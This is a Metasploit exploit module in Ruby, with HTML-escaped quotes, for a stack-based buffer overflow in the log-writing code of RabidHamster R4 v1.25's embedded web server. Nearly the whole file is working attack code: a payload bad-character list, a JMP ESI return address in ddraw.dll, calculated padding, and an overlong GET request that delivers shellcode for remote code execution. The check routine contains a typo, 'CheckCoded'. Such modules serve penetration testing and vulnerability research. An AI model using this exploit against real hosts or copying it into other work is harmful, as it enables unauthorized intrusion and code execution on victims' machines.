# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "RabidHamster R4 Log Entry sprintf() Buffer Overflow",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in RabidHamster R4&#039;s web server.
                By supplying a malformed HTTP request, it is possible to trigger a stack-based
                buffer overflow when generating a log, which may result in arbitrary code
                execution under the context of the user.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Luigi Auriemma&#039;,  #Discovery, PoC
                    &#039;sinn3r&#039;           #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;OSVDB&#039;, &#039;79007&#039;],
                    [&#039;URL&#039;, &#039;http://aluigi.altervista.org/adv/r4_1-adv.txt&#039;],
                    [&#039;URL&#039;, &#039;http://secunia.com/advisories/47901/&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;StackAdjustment&#039; => -3500,
                    &#039;BadChars&#039; => "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x20"
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => "process"
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [&#039;R4 v1.25&#039;, {&#039;Ret&#039;=>0x73790533}]  #JMP ESI (ddraw.dll)
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Feb 09 2012",
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptPort.new(&#039;RPORT&#039;, [true, &#039;The remote port&#039;, 8888])
                ], self.class)
    end
 
    def check
        res = send_request_cgi({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => &#039;/&#039;
        })
 
        if res and res.headers[&#039;Server&#039;] == &#039;R4 Embedded Server&#039;
            return Exploit::CheckCode::Detected
        else
            return Exploit::CheckCoded::Safe
        end
    end
 
    def exploit
        buf = &#039;&#039;
        buf << payload.encoded
        buf << rand_text_alpha(2022-buf.length, payload_badchars)
        buf << [target.ret].pack("V*")
        buf << pattern_create(200)
        buf << rand_text_alpha(3000-buf.length, payload_badchars)
 
        send_request_cgi({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => "/?#{buf}"
        })
    end
end



